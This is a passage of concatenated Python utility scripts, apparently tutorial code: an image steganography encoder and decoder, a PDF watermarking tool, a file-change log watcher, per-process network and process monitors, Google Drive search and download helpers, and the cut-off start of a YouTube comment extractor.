                        # replace the `bit` least significant bit of the green pixel with the data bit
                        pixel[1] = int(g[:-bit] + binary_secret_data[data_index] + g[-bit + 1:], 2)
                    data_index += 1
                if data_index < data_len:
                    if bit == 1:
                        # least significant blue pixel bit
                        pixel[2] = int(b[:-bit] + binary_secret_data[data_index], 2)
                    elif bit > 1:
                        # replace the `bit` least significant bit of the blue pixel with the data bit
                        pixel[2] = int(b[:-bit] + binary_secret_data[data_index] + b[-bit + 1:], 2)
                    data_index += 1
                # if data is encoded, just break out of the loop
                if data_index >= data_len:
                    break
    return image


def decode(image_name, n_bits=1, in_bytes=False):
    print("[+] Decoding...")
    # read the image
    image = cv2.imread(image_name)
    binary_data = ""
    for bit in range(1, n_bits + 1):
        for row in image:
            for pixel in row:
                r, g, b = to_bin(pixel)
                binary_data += r[-bit]
                binary_data += g[-bit]
                binary_data += b[-bit]

    # split by 8-bits
    all_bytes = [binary_data[i: i + 8] for i in range(0, len(binary_data), 8)]
    # convert from bits to characters
    if in_bytes:
        # if the data we'll decode is binary data,
        # we initialize bytearray instead of string
        decoded_data = bytearray()
        for byte in all_bytes:
            # append the data after converting from binary
            decoded_data.append(int(byte, 2))
            if decoded_data[-5:] == b"=====":
                # exit out of the loop if we find the stopping criteria
                break
    else:
        decoded_data = ""
        for byte in all_bytes:
            decoded_data += chr(int(byte, 2))
            if decoded_data[-5:] == "=====":
                break
    return decoded_data[:-5]


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(
        description="Steganography encoder/decoder, this Python scripts encode data within images.")
    parser.add_argument("-t", "--text",
                        help="The text data to encode into the image, this only should be specified for encoding")
    parser.add_argument("-f", "--file",
                        help="The file to hide into the image, this only should be specified while encoding")
    parser.add_argument("-e", "--encode", help="Encode the following image")
    parser.add_argument("-d", "--decode", help="Decode the following image")
    parser.add_argument("-b", "--n-bits", help="The number of least significant bits of the image to encode", type=int,
                        default=2)

    args = parser.parse_args()
    if args.encode:
        # if the encode argument is specified
        if args.text:
            secret_data = args.text
        elif args.file:
            with open(args.file, "rb") as f:
                secret_data = f.read()
        input_image = args.encode
        # split the absolute path and the file
        path, file = os.path.split(input_image)
        # split the filename and the image extension
        filename, ext = file.split(".")
        output_image = os.path.join(path, f"{filename}_encoded.{ext}")
        # encode the data into the image
        encoded_image = encode(image_name=input_image, secret_data=secret_data, n_bits=args.n_bits)
        # save the output image (encoded image)
        cv2.imwrite(output_image, encoded_image)
        print("[+] Saved encoded image.")
    if args.decode:
        input_image = args.decode
        if args.file:
            # decode the secret data from the image and write it to file
            decoded_data = decode(input_image, n_bits=args.n_bits, in_bytes=True)
            with open(args.file, "wb") as f:
                f.write(decoded_data)
            print(f"[+] File decoded, {args.file} is saved successfully.")
        else:
            # decode the secret data from the image and print it in the console
            decoded_data = decode(input_image, n_bits=args.n_bits)
            print("[+] Decoded data:", decoded_data)




from PyPDF4 import PdfFileReader, PdfFileWriter
from PyPDF4.pdf import ContentStream
from PyPDF4.generic import TextStringObject, NameObject
from PyPDF4.utils import b_
import os
import argparse
from io import BytesIO
from typing import Tuple
# Import the reportlab library
from reportlab.pdfgen import canvas
# The size of the page supposedly A4
from reportlab.lib.pagesizes import A4
# The color of the watermark
from reportlab.lib import colors

PAGESIZE = A4
FONTNAME = 'Helvetica-Bold'
FONTSIZE = 40
# using colors module
# COLOR = colors.lightgrey
# or simply RGB
# COLOR = (190, 190, 190)
COLOR = colors.red
# The position attributes of the watermark
X = 250
Y = 10
# The rotation angle in order to display the watermark diagonally if needed
ROTATION_ANGLE = 45


def get_info(input_file: str):
    """
    Extracting the file info
    """
    # If PDF is encrypted the file metadata cannot be extracted
    with open(input_file, 'rb') as pdf_file:
        pdf_reader = PdfFileReader(pdf_file, strict=False)
        output = {
            "File": input_file, "Encrypted": ("True" if pdf_reader.isEncrypted else "False")
        }
        if not pdf_reader.isEncrypted:
            info = pdf_reader.getDocumentInfo()
            num_pages = pdf_reader.getNumPages()
            output["Author"] = info.author
            output["Creator"] = info.creator
            output["Producer"] = info.producer
            output["Subject"] = info.subject
            output["Title"] = info.title
            output["Number of pages"] = num_pages
    # To Display collected metadata
    print("## File Information ##################################################")
    print("\n".join("{}:{}".format(i, j) for i, j in output.items()))
    print("######################################################################")
    return True, output


def get_output_file(input_file: str, output_file: str):
    """
    Check whether a temporary output file is needed or not
    """
    input_path = os.path.dirname(input_file)
    input_filename = os.path.basename(input_file)
    # If output file is empty -> generate a temporary output file
    # If output file is equal to input_file -> generate a temporary output file
    if not output_file or input_file == output_file:
        tmp_file = os.path.join(input_path, 'tmp_' + input_filename)
        return True, tmp_file
    return False, output_file


def create_watermark(wm_text: str):
    """
    Creates a watermark template.
    """
    if wm_text:
        # Generate the output to a memory buffer
        output_buffer = BytesIO()
        # Default Page Size = A4
        c = canvas.Canvas(output_buffer, pagesize=PAGESIZE)
        # you can also add image instead of text
        # c.drawImage("logo.png", X, Y, 160, 160)
        # Set the size and type of the font
        c.setFont(FONTNAME, FONTSIZE)
        # Set the color
        if isinstance(COLOR, tuple):
            color = (c/255 for c in COLOR)
            c.setFillColorRGB(*color)
        else:
            c.setFillColor(COLOR)
        # Rotate according to the configured parameter
        c.rotate(ROTATION_ANGLE)
        # Position according to the configured parameter
        c.drawString(X, Y, wm_text)
        c.save()
        return True, output_buffer
    return False, None


def save_watermark(wm_buffer, output_file):
    """
    Saves the generated watermark template to disk
    """
    with open(output_file, mode='wb') as f:
        f.write(wm_buffer.getbuffer())
    f.close()
    return True


def watermark_pdf(input_file: str, wm_text: str, pages: Tuple = None):
    """
    Adds watermark to a pdf file.
    """
    result, wm_buffer = create_watermark(wm_text)
    if result:
        wm_reader = PdfFileReader(wm_buffer)
        pdf_reader = PdfFileReader(open(input_file, 'rb'), strict=False)
        pdf_writer = PdfFileWriter()
        try:
            for page in range(pdf_reader.getNumPages()):
                # If required to watermark specific pages not all the document pages
                if pages:
                    if str(page) not in pages:
                        continue
                page = pdf_reader.getPage(page)
                page.mergePage(wm_reader.getPage(0))
                pdf_writer.addPage(page)
        except Exception as e:
            print("Exception = ", e)
            return False, None, None

        return True, pdf_reader, pdf_writer


def unwatermark_pdf(input_file: str, wm_text: str, pages: Tuple = None):
    """
    Removes watermark from the pdf file.
    """
    pdf_reader = PdfFileReader(open(input_file, 'rb'), strict=False)
    pdf_writer = PdfFileWriter()
    for page in range(pdf_reader.getNumPages()):
        # If required for specific pages
        if pages:
            if str(page) not in pages:
                continue
        page = pdf_reader.getPage(page)
        # Get the page content
        content_object = page["/Contents"].getObject()
        content = ContentStream(content_object, pdf_reader)
        # Loop through all the elements page elements
        for operands, operator in content.operations:
            # Checks the TJ operator and replaces the corresponding string operand (Watermark text) with ''
            if operator == b_("Tj"):
                text = operands[0]
                if isinstance(text, str) and text.startswith(wm_text):
                    operands[0] = TextStringObject('')
        page.__setitem__(NameObject('/Contents'), content)
        pdf_writer.addPage(page)
    return True, pdf_reader, pdf_writer


def watermark_unwatermark_file(**kwargs):
    input_file = kwargs.get('input_file')
    wm_text = kwargs.get('wm_text')
    # watermark   -> Watermark
    # unwatermark -> Unwatermark
    action = kwargs.get('action')
    # HDD -> Temporary files are saved on the Hard Disk Drive and then deleted
    # RAM -> Temporary files are saved in memory and then deleted.
    mode = kwargs.get('mode')
    pages = kwargs.get('pages')
    temporary, output_file = get_output_file(
        input_file, kwargs.get('output_file'))
    if action == "watermark":
        result, pdf_reader, pdf_writer = watermark_pdf(
            input_file=input_file, wm_text=wm_text, pages=pages)
    elif action == "unwatermark":
        result, pdf_reader, pdf_writer = unwatermark_pdf(
            input_file=input_file, wm_text=wm_text, pages=pages)
    # Completed successfully
    if result:
        # Generate to memory
        if mode == "RAM":
            output_buffer = BytesIO()
            pdf_writer.write(output_buffer)
            pdf_reader.stream.close()
            # No need to create a temporary file in RAM Mode
            if temporary:
                output_file = input_file
            with open(output_file, mode='wb') as f:
                f.write(output_buffer.getbuffer())
            f.close()
        elif mode == "HDD":
            # Generate to a new file on the hard disk
            with open(output_file, 'wb') as pdf_output_file:
                pdf_writer.write(pdf_output_file)
            pdf_output_file.close()

            pdf_reader.stream.close()
            if temporary:
                if os.path.isfile(input_file):
                    os.replace(output_file, input_file)
                output_file = input_file


def watermark_unwatermark_folder(**kwargs):
    """
    Watermarks all PDF Files within a specified path
    Unwatermarks all PDF Files within a specified path
    """
    input_folder = kwargs.get('input_folder')
    wm_text = kwargs.get('wm_text')
    # Run in recursive mode
    recursive = kwargs.get('recursive')
    # watermark   -> Watermark
    # unwatermark -> Unwatermark
    action = kwargs.get('action')
    # HDD -> Temporary files are saved on the Hard Disk Drive and then deleted
    # RAM -> Temporary files are saved in memory and then deleted.
    mode = kwargs.get('mode')
    pages = kwargs.get('pages')
    # Loop though the files within the input folder.
    for foldername, dirs, filenames in os.walk(input_folder):
        for filename in filenames:
            # Check if pdf file
            if not filename.endswith('.pdf'):
                continue
            # PDF File found
            inp_pdf_file = os.path.join(foldername, filename)
            print("Processing file:", inp_pdf_file)
            watermark_unwatermark_file(input_file=inp_pdf_file, output_file=None,
                                       wm_text=wm_text, action=action, mode=mode, pages=pages)
        if not recursive:
            break


def is_valid_path(path):
    """
    Validates the path inputted and checks whether it is a file path or a folder path
    """
    if not path:
        raise ValueError(f"Invalid Path")
    if os.path.isfile(path):
        return path
    elif os.path.isdir(path):
        return path
    else:
        raise ValueError(f"Invalid Path {path}")


def parse_args():
    """
    Get user command line parameters
    """
    parser = argparse.ArgumentParser(description="Available Options")
    parser.add_argument('-i', '--input_path', dest='input_path', type=is_valid_path,
                        required=True, help="Enter the path of the file or the folder to process")
    parser.add_argument('-a', '--action', dest='action', choices=[
                        'watermark', 'unwatermark'], type=str, default='watermark',
                        help="Choose whether to watermark or to unwatermark")
    parser.add_argument('-m', '--mode', dest='mode', choices=['RAM', 'HDD'], type=str,
                        default='RAM', help="Choose whether to process on the hard disk drive or in memory")
    parser.add_argument('-w', '--watermark_text', dest='watermark_text',
                        type=str, required=True, help="Enter a valid watermark text")
    parser.add_argument('-p', '--pages', dest='pages', type=tuple,
                        help="Enter the pages to consider e.g.: [2,4]")
    path = parser.parse_known_args()[0].input_path
    if os.path.isfile(path):
        parser.add_argument('-o', '--output_file', dest='output_file',
                            type=str, help="Enter a valid output file")
    if os.path.isdir(path):
        parser.add_argument('-r', '--recursive', dest='recursive', default=False, type=lambda x: (
            str(x).lower() in ['true', '1', 'yes']), help="Process Recursively or Non-Recursively")
    # To Porse The Command Line Arguments
    args = vars(parser.parse_args())
    # To Display The Command Line Arguments
    print("## Command Arguments #################################################")
    print("\n".join("{}:{}".format(i, j) for i, j in args.items()))
    print("######################################################################")
    return args


if __name__ == '__main__':
    # Parsing command line arguments entered by user
    args = parse_args()
    # If File Path
    if os.path.isfile(args['input_path']):
        # Extracting File Info
        get_info(input_file=args['input_path'])
        # Encrypting or Decrypting a File
        watermark_unwatermark_file(
            input_file=args['input_path'], wm_text=args['watermark_text'], action=args[
                'action'], mode=args['mode'], output_file=args['output_file'], pages=args['pages']
        )
    # If Folder Path
    elif os.path.isdir(args['input_path']):
        # Encrypting or Decrypting a Folder
        watermark_unwatermark_folder(
            input_folder=args['input_path'], wm_text=args['watermark_text'],
            action=args['action'], mode=args['mode'], recursive=args['recursive'], pages=args['pages']
        )


# The Observer watches for any file change and then dispatches the respective events to an event handler.
from watchdog.observers import Observer
# The event handler will be notified when an event occurs.
from watchdog.events import FileSystemEventHandler
import time
import config
import os
from checker import FileChecker
import datetime
from colorama import Fore, Style, init

init()

GREEN = Fore.GREEN
BLUE = Fore.BLUE
RED = Fore.RED
YELLOW = Fore.YELLOW

event2color = {
    "created": GREEN,
    "modified": BLUE,
    "deleted": RED,
    "moved": YELLOW,
}


def print_with_color(s, color=Fore.WHITE, brightness=Style.NORMAL, **kwargs):
    """Utility function wrapping the regular `print()` function
    but with colors and brightness"""
    print(f"{brightness}{color}{s}{Style.RESET_ALL}", **kwargs)


# Class that inherits from FileSystemEventHandler for handling the events sent by the Observer
class LogHandler(FileSystemEventHandler):

    def __init__(self, watchPattern, exceptionPattern, doWatchDirectories):
        self.watchPattern = watchPattern
        self.exceptionPattern = exceptionPattern
        self.doWatchDirectories = doWatchDirectories
        # Instantiate the checker
        self.fc = FileChecker(self.exceptionPattern)

    def on_any_event(self, event):
        now = (datetime.datetime.now()).strftime("%Y-%m-%d %H:%M:%S")
        # print("event happened:", event)
        # To Observe files only not directories
        if not event.is_directory:
            # To cater for the on_move event
            path = event.src_path
            if hasattr(event, 'dest_path'):
                path = event.dest_path
            # Ensure that the file extension is among the pre-defined ones.
            if path.endswith(self.watchPattern):
                msg = f"{now} -- {event.event_type} -- File: {path}"
                if event.event_type in ('modified', 'created', 'moved'):
                    # check for exceptions in log files
                    if path.endswith(config.LOG_FILES_EXTENSIONS):
                        for type, msg in self.fc.checkForException(event=event, path=path):
                            print_with_color(
                                msg, color=event2color[event.event_type], brightness=Style.BRIGHT)
                    else:
                        print_with_color(
                            msg, color=event2color[event.event_type])
                else:
                    print_with_color(msg, color=event2color[event.event_type])
        elif self.doWatchDirectories:
            msg = f"{now} -- {event.event_type} -- Folder: {event.src_path}"
            print_with_color(msg, color=event2color[event.event_type])

    def on_modified(self, event):
        pass

    def on_deleted(self, event):
        pass

    def on_created(self, event):
        pass

    def on_moved(self, event):
        pass


class LogWatcher:
    # Initialize the observer
    observer = None
    # Initialize the stop signal variable
    stop_signal = 0

    # The observer is the class that watches for any file system change and then dispatches the event to the event handler.
    def __init__(self, watchDirectory, watchDelay, watchRecursively, watchPattern, doWatchDirectories, exceptionPattern):
        # Initialize variables in relation
        self.watchDirectory = watchDirectory
        self.watchDelay = watchDelay
        self.watchRecursively = watchRecursively
        self.watchPattern = watchPattern
        self.doWatchDirectories = doWatchDirectories
        self.exceptionPattern = exceptionPattern

        # Create an instance of watchdog.observer
        self.observer = Observer()
        # The event handler is an object that will be notified when something happens to the file system.
        self.event_handler = LogHandler(
            watchPattern, exceptionPattern, self.doWatchDirectories)

    def schedule(self):
        print("Observer Scheduled:", self.observer.name)
        # Call the schedule function via the Observer instance attaching the event
        self.observer.schedule(
            self.event_handler, self.watchDirectory, recursive=self.watchRecursively)

    def start(self):
        print("Observer Started:", self.observer.name)
        self.schedule()
        # Start the observer thread and wait for it to generate events
        now = (datetime.datetime.now()).strftime("%Y-%m-%d %H:%M:%S")
        msg = f"Observer: {self.observer.name} - Started On: {now}"
        print(msg)

        msg = (
            f"Watching {'Recursively' if self.watchRecursively else 'Non-Recursively'}: {self.watchPattern}"
            f" -- Folder: {self.watchDirectory} -- Every: {self.watchDelay}(sec) -- For Patterns: {self.exceptionPattern}"
        )
        print(msg)
        self.observer.start()

    def run(self):
        print("Observer is running:", self.observer.name)
        self.start()
        try:
            while True:
                time.sleep(self.watchDelay)

                if self.stop_signal == 1:
                    print(
                        f"Observer stopped: {self.observer.name}  stop signal:{self.stop_signal}")
                    self.stop()
                    break
        except:
            self.stop()
        self.observer.join()

    def stop(self):
        print("Observer Stopped:", self.observer.name)

        now = (datetime.datetime.now()).strftime("%Y-%m-%d %H:%M:%S")
        msg = f"Observer: {self.observer.name} - Stopped On: {now}"
        print(msg)
        self.observer.stop()
        self.observer.join()

    def info(self):
        info = {
            'observerName': self.observer.name,
            'watchDirectory': self.watchDirectory,
            'watchDelay': self.watchDelay,
            'watchRecursively': self.watchRecursively,
            'watchPattern': self.watchPattern,
        }
        return info


def is_dir_path(path):
    """Utility function to check whether a path is an actual directory"""
    if os.path.isdir(path):
        return path
    else:
        raise NotADirectoryError(path)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(
        description="Watchdog script for watching for files & directories' changes")
    parser.add_argument("path",
                        default=config.WATCH_DIRECTORY,
                        type=is_dir_path,
                        )
    parser.add_argument("-d", "--watch-delay",
                        help=f"Watch delay, default is {config.WATCH_DELAY}",
                        default=config.WATCH_DELAY,
                        type=int,
                        )
    parser.add_argument("-r", "--recursive",
                        action="store_true",
                        help=f"Whether to recursively watch for the path's children, default is {config.WATCH_RECURSIVELY}",
                        default=config.WATCH_RECURSIVELY,
                        )
    parser.add_argument("-p", "--pattern",
                        help=f"Pattern of files to watch, default is {config.WATCH_PATTERN}",
                        default=config.WATCH_PATTERN,
                        )
    parser.add_argument("--watch-directories",
                        action="store_true",
                        help=f"Whether to watch directories, default is {config.DO_WATCH_DIRECTORIES}",
                        default=config.DO_WATCH_DIRECTORIES,
                        )
    # parse the arguments
    args = parser.parse_args()
    # define & launch the log watcher
    log_watcher = LogWatcher(
        watchDirectory=args.path,
        watchDelay=args.watch_delay,
        watchRecursively=args.recursive,
        watchPattern=tuple(args.pattern.split(",")),
        doWatchDirectories=args.watch_directories,
        exceptionPattern=config.EXCEPTION_PATTERN,
    )
    log_watcher.run()

from scapy.all import *
import psutil
from collections import defaultdict
import os
from threading import Thread
import pandas as pd

# get the all network adapter's MAC addresses
all_macs = {iface.mac for iface in ifaces.values()}
# A dictionary to map each connection to its correponding process ID (PID)
connection2pid = {}
# A dictionary to map each process ID (PID) to total Upload (0) and Download (1) traffic
pid2traffic = defaultdict(lambda: [0, 0])
# the global Pandas DataFrame that's used to track previous traffic stats
global_df = None
# global boolean for status of the program
is_program_running = True


def get_size(bytes):
    """
    Returns size of bytes in a nice format
    """
    for unit in ['', 'K', 'M', 'G', 'T', 'P']:
        if bytes < 1024:
            return f"{bytes:.2f}{unit}B"
        bytes /= 1024


def process_packet(packet):
    global pid2traffic
    try:
        # get the packet source & destination IP addresses and ports
        packet_connection = (packet.sport, packet.dport)
    except (AttributeError, IndexError):
        # sometimes the packet does not have TCP/UDP layers, we just ignore these packets
        pass
    else:
        # get the PID responsible for this connection from our `connection2pid` global dictionary
        packet_pid = connection2pid.get(packet_connection)
        if packet_pid:
            if packet.src in all_macs:
                # the source MAC address of the packet is our MAC address
                # so it's an outgoing packet, meaning it's upload
                pid2traffic[packet_pid][0] += len(packet)
            else:
                # incoming packet, download
                pid2traffic[packet_pid][1] += len(packet)


def get_connections():
    """A function that keeps listening for connections on this machine
    and adds them to `connection2pid` global variable"""
    global connection2pid
    while is_program_running:
        # using psutil, we can grab each connection's source and destination ports
        # and their process ID
        for c in psutil.net_connections():
            if c.laddr and c.raddr and c.pid:
                # if local address, remote address and PID are in the connection
                # add them to our global dictionary
                connection2pid[(c.laddr.port, c.raddr.port)] = c.pid
                connection2pid[(c.raddr.port, c.laddr.port)] = c.pid
        # sleep for a second, feel free to adjust this
        time.sleep(1)


def print_pid2traffic():
    global global_df
    # initialize the list of processes
    processes = []
    for pid, traffic in pid2traffic.items():
        # `pid` is an integer that represents the process ID
        # `traffic` is a list of two values: total Upload and Download size in bytes
        try:
            # get the process object from psutil
            p = psutil.Process(pid)
        except psutil.NoSuchProcess:
            # if process is not found, simply continue to the next PID for now
            continue
        # get the name of the process, such as chrome.exe, etc.
        name = p.name()
        # get the time the process was spawned
        try:
            create_time = datetime.fromtimestamp(p.create_time())
        except OSError:
            # system processes, using boot time instead
            create_time = datetime.fromtimestamp(psutil.boot_time())
        # construct our dictionary that stores process info
        process = {
            "pid": pid, "name": name, "create_time": create_time, "Upload": traffic[0],
            "Download": traffic[1],
        }
        try:
            # calculate the upload and download speeds by simply subtracting the old stats from the new stats
            process["Upload Speed"] = traffic[0] - global_df.at[pid, "Upload"]
            process["Download Speed"] = traffic[1] - global_df.at[pid, "Download"]
        except (KeyError, AttributeError):
            # If it's the first time running this function, then the speed is the current traffic
            # You can think of it as if old traffic is 0
            process["Upload Speed"] = traffic[0]
            process["Download Speed"] = traffic[1]
        # append the process to our processes list
        processes.append(process)
    # construct our Pandas DataFrame
    df = pd.DataFrame(processes)
    try:
        # set the PID as the index of the dataframe
        df = df.set_index("pid")
        # sort by column, feel free to edit this column
        df.sort_values("Download", inplace=True, ascending=False)
    except KeyError as e:
        # when dataframe is empty
        pass
    # make another copy of the dataframe just for fancy printing
    printing_df = df.copy()
    try:
        # apply the function get_size to scale the stats like '532.6KB/s', etc.
        printing_df["Download"] = printing_df["Download"].apply(get_size)
        printing_df["Upload"] = printing_df["Upload"].apply(get_size)
        printing_df["Download Speed"] = printing_df["Download Speed"].apply(get_size).apply(lambda s: f"{s}/s")
        printing_df["Upload Speed"] = printing_df["Upload Speed"].apply(get_size).apply(lambda s: f"{s}/s")
    except KeyError as e:
        # when dataframe is empty again
        pass
    # clear the screen based on your OS
    os.system("cls") if "nt" in os.name else os.system("clear")
    # print our dataframe
    print(printing_df.to_string())
    # update the global df to our dataframe
    global_df = df


def print_stats():
    """Simple function that keeps printing the stats"""
    while is_program_running:
        time.sleep(1)
        print_pid2traffic()


if __name__ == "__main__":
    # start the printing thread
    printing_thread = Thread(target=print_stats)
    printing_thread.start()
    # start the get_connections() function to update the current connections of this machine
    connections_thread = Thread(target=get_connections)
    connections_thread.start()
    # start sniffing
    print("Started sniffing")
    sniff(prn=process_packet, store=False)
    # setting the global variable to False to exit the program
    is_program_running = False

import psutil
from datetime import datetime
import pandas as pd
import time
import os


def get_size(bytes):
    """
    Returns size of bytes in a nice format
    """
    for unit in ['', 'K', 'M', 'G', 'T', 'P']:
        if bytes < 1024:
            return f"{bytes:.2f}{unit}B"
        bytes /= 1024


def get_processes_info():
    # the list the contain all process dictionaries
    processes = []
    for process in psutil.process_iter():
        # get all process info in one shot
        with process.oneshot():
            # get the process id
            pid = process.pid
            if pid == 0:
                # System Idle Process for Windows NT, useless to see anyways
                continue
            # get the name of the file executed
            name = process.name()
            # get the time the process was spawned
            try:
                create_time = datetime.fromtimestamp(process.create_time())
            except OSError:
                # system processes, using boot time instead
                create_time = datetime.fromtimestamp(psutil.boot_time())
            try:
                # get the number of CPU cores that can execute this process
                cores = len(process.cpu_affinity())
            except psutil.AccessDenied:
                cores = 0
            # get the CPU usage percentage
            cpu_usage = process.cpu_percent()
            # get the status of the process (running, idle, etc.)
            status = process.status()
            try:
                # get the process priority (a lower value means a more prioritized process)
                nice = int(process.nice())
            except psutil.AccessDenied:
                nice = 0
            try:
                # get the memory usage in bytes
                memory_usage = process.memory_full_info().uss
            except psutil.AccessDenied:
                memory_usage = 0
            # total process read and written bytes
            io_counters = process.io_counters()
            read_bytes = io_counters.read_bytes
            write_bytes = io_counters.write_bytes
            # get the number of total threads spawned by this process
            n_threads = process.num_threads()
            # get the username of user spawned the process
            try:
                username = process.username()
            except psutil.AccessDenied:
                username = "N/A"

        processes.append({
            'pid': pid, 'name': name, 'create_time': create_time,
            'cores': cores, 'cpu_usage': cpu_usage, 'status': status, 'nice': nice,
            'memory_usage': memory_usage, 'read_bytes': read_bytes, 'write_bytes': write_bytes,
            'n_threads': n_threads, 'username': username,
        })

    return processes


def construct_dataframe(processes):
    # convert to pandas dataframe
    df = pd.DataFrame(processes)
    # set the process id as index of a process
    df.set_index('pid', inplace=True)
    # sort rows by the column passed as argument
    df.sort_values(sort_by, inplace=True, ascending=not descending)
    # pretty printing bytes
    df['memory_usage'] = df['memory_usage'].apply(get_size)
    df['write_bytes'] = df['write_bytes'].apply(get_size)
    df['read_bytes'] = df['read_bytes'].apply(get_size)
    # convert to proper date format
    df['create_time'] = df['create_time'].apply(datetime.strftime, args=("%Y-%m-%d %H:%M:%S",))
    # reorder and define used columns
    df = df[columns.split(",")]
    return df


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="Process Viewer & Monitor")
    parser.add_argument("-c", "--columns", help="""Columns to show,
                                                available are name,create_time,cores,cpu_usage,status,nice,memory_usage,read_bytes,write_bytes,n_threads,username.
                                                Default is name,cpu_usage,memory_usage,read_bytes,write_bytes,status,create_time,nice,n_threads,cores.""",
                        default="name,cpu_usage,memory_usage,read_bytes,write_bytes,status,create_time,nice,n_threads,cores")
    parser.add_argument("-s", "--sort-by", dest="sort_by", help="Column to sort by, default is memory_usage .",
                        default="memory_usage")
    parser.add_argument("--descending", action="store_true", help="Whether to sort in descending order.")
    parser.add_argument("-n", help="Number of processes to show, will show all if 0 is specified, default is 25 .",
                        default=25)
    parser.add_argument("-u", "--live-update", action="store_true",
                        help="Whether to keep the program on and updating process information each second")

    # parse arguments
    args = parser.parse_args()
    columns = args.columns
    sort_by = args.sort_by
    descending = args.descending
    n = int(args.n)
    live_update = args.live_update
    # print the processes for the first time
    processes = get_processes_info()
    df = construct_dataframe(processes)
    if n == 0:
        print(df.to_string())
    elif n > 0:
        print(df.head(n).to_string())
    # print continuously
    while live_update:
        # get all process info
        processes = get_processes_info()
        df = construct_dataframe(processes)
        # clear the screen depending on your OS
        os.system("cls") if "nt" in os.name else os.system("clear")
        if n == 0:
            print(df.to_string())
        elif n > 0:
            print(df.head(n).to_string())
        time.sleep(0.7)



import pickle
import os
import re
import io
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from googleapiclient.http import MediaIoBaseDownload
import requests
from tqdm import tqdm

# If modifying these scopes, delete the file token.pickle.
SCOPES = ['https://www.googleapis.com/auth/drive.metadata',
          'https://www.googleapis.com/auth/drive',
          'https://www.googleapis.com/auth/drive.file'
          ]


def get_gdrive_service():
    creds = None
    # The file token.pickle stores the user's access and refresh tokens, and is
    # created automatically when the authorization flow completes for the first
    # time.
    if os.path.exists('token.pickle'):
        with open('token.pickle', 'rb') as token:
            creds = pickle.load(token)
    # If there are no (valid) credentials available, let the user log in.
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
                'credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open('token.pickle', 'wb') as token:
            pickle.dump(creds, token)
    # initiate Google Drive service API
    return build('drive', 'v3', credentials=creds)


def download_file_from_google_drive(id, destination):
    def get_confirm_token(response):
        for key, value in response.cookies.items():
            if key.startswith('download_warning'):
                return value
        return None

    def save_response_content(response, destination):
        CHUNK_SIZE = 32768
        # get the file size from Content-length response header
        file_size = int(response.headers.get("Content-Length", 0))
        # extract Content disposition from response headers
        content_disposition = response.headers.get("content-disposition")
        # parse filename
        filename = re.findall("filename=\"(.+)\"", content_disposition)[0]
        print("[+] File size:", file_size)
        print("[+] File name:", filename)
        progress = tqdm(response.iter_content(CHUNK_SIZE), f"Downloading {filename}", total=file_size, unit="Byte", unit_scale=True, unit_divisor=1024)
        with open(destination, "wb") as f:
            for chunk in progress:
                if chunk: # filter out keep-alive new chunks
                    f.write(chunk)
                    # update the progress bar
                    progress.update(len(chunk))
        progress.close()

    # base URL for download
    URL = "https://docs.google.com/uc?export=download"
    # init a HTTP session
    session = requests.Session()
    # make a request
    response = session.get(URL, params = {'id': id}, stream=True)
    print("[+] Downloading", response.url)
    # get confirmation token
    token = get_confirm_token(response)
    if token:
        params = {'id': id, 'confirm':token}
        response = session.get(URL, params=params, stream=True)
    # download to disk
    save_response_content(response, destination)


def search(service, query):
    # search for the file
    result = []
    page_token = None
    while True:
        response = service.files().list(q=query,
                                        spaces="drive",
                                        fields="nextPageToken, files(id, name, mimeType)",
                                        pageToken=page_token).execute()
        # iterate over filtered files
        for file in response.get("files", []):
            print(f"Found file: {file['name']} with the id {file['id']} and type {file['mimeType']}")
            result.append((file["id"], file["name"], file["mimeType"]))
        page_token = response.get('nextPageToken', None)
        if not page_token:
            # no more files
            break
    return result


def download():
    service = get_gdrive_service()
    # the name of the file you want to download from Google Drive
    filename = "bbc.zip"
    # search for the file by name
    search_result = search(service, query=f"name='{filename}'")
    # get the GDrive ID of the file
    file_id = search_result[0][0]
    # make it shareable
    service.permissions().create(body={"role": "reader", "type": "anyone"}, fileId=file_id).execute()
    # download file
    download_file_from_google_drive(file_id, filename)


if __name__ == '__main__':
    download()

import pickle
import os
from googleapiclient.discovery import build
from google_auth_oauthlib.flow import InstalledAppFlow
from google.auth.transport.requests import Request
from tabulate import tabulate

# If modifying these scopes, delete the file token.pickle.
SCOPES = ['https://www.googleapis.com/auth/drive.metadata']


def get_gdrive_service():
    creds = None
    # The file token.pickle stores the user's access and refresh tokens, and is
    # created automatically when the authorization flow completes for the first
    # time.
    if os.path.exists('token.pickle'):
        with open('token.pickle', 'rb') as token:
            creds = pickle.load(token)
    # If there are no (valid) credentials available, let the user log in.
    if not creds or not creds.valid:
        if creds and creds.expired and creds.refresh_token:
            creds.refresh(Request())
        else:
            flow = InstalledAppFlow.from_client_secrets_file(
                'credentials.json', SCOPES)
            creds = flow.run_local_server(port=0)
        # Save the credentials for the next run
        with open('token.pickle', 'wb') as token:
            pickle.dump(creds, token)

    return build('drive', 'v3', credentials=creds)


def search(service, query):
    # search for the file
    result = []
    page_token = None
    while True:
        response = service.files().list(q=query,
                                        spaces="drive",
                                        fields="nextPageToken, files(id, name, mimeType)",
                                        pageToken=page_token).execute()
        # iterate over filtered files
        for file in response.get("files", []):
            result.append((file["id"], file["name"], file["mimeType"]))
        page_token = response.get('nextPageToken', None)
        if not page_token:
            # no more files
            break
    return result


def main():
    # filter to text files
    filetype = "text/plain"
    # authenticate Google Drive API
    service = get_gdrive_service()
    # search for files that has type of text/plain
    search_result = search(service, query=f"mimeType='{filetype}'")
    # convert to table to print well
    table = tabulate(search_result, headers=["ID", "Name", "Type"])
    print(table)


if __name__ == '__main__':
    main()

from utils import youtube_authenticate, get_video_id_by_url, get_channel_id_by_url


def get_comments(youtube, **kwargs):
    return youtube.commentThreads().list(
        part="snippet",
        **kwargs
    ).execute()


if __name__ == "__main__":
    # authenticate to YouTube API
    youtube = youtube_authenticate()
    # URL can be a channel or a video, to extract comments
    url = "https://www.youtube.com/watch?v=jNQXAC9IVRw&ab_channel=jawed"
    if "watch" in url:
        # that's a video
        video_id = get_video_id_by_url(url)
        params = {
            'videoId': video_id,
